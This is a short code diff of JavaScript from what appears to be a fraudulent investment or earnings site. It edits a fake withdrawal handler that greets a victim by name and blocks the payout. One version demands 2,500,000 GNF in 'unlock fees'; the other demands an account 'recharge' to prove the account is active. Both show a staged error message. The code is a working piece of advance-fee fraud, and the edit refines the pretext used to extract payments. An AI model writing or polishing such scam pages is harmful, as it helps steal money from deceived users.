@@ -332,10 +332,10 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher CAMPEL, veuillez régler vos frais de déblocage de 2 500 000 GNF afin de recevoir vos bénéfices dans les 5 minutes.');
+                alert('Cher CAMPEL, veuillez recharger votre compte afin de justifier que ce dernier es actif afin de recevoir vos bénéfices imédiatement.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
-                errorMessage.textContent = 'Erreur : Frais de déblocage requis.';
+                errorMessage.textContent = 'Erreur : Compte inactif.';
             });
 
             document.getElementById('whatsapp-button').addEventListener('click', () => {
